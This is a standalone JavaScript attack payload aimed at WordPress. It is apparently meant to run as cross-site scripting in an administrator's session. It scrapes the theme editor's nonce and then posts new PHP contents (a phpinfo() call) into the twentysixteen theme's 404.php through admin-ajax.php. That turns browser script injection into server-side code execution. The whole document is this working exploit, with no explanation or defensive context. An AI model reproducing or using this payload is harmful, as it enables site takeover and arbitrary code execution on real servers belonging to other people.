fetch("http://"+document.domain+"/wp-admin/theme-editor.php?file=404.php&theme=twentysixteen",{
    credentials: "include",
    method: "GET"
}).then(function(response) {
    return response.text();
}).then(function(data) {
    var parser = new DOMParser();
    var htmlDoc = parser.parseFromString(data, 'text/html');
    var wp_nonce = htmlDoc.getElementById('nonce').value;
    console.log(wp_nonce);
    fetch("http://"+document.domain+"/wp-admin/admin-ajax.php",{
        headers: new Headers({
            "Accept": "*\/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application\/x-www-form-urlencoded; charset=UTF-8"
        }),
        body: "nonce="+wp_nonce+"&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3D404.php%26theme%3Dtwentysixteen&newcontent=%3C%3Fphp+phpinfo()%3B%3F%3E&action=edit-theme-plugin-file&file=404.php&theme=twentysixteen",
        credentials: "include",
        method: "POST"
    })
})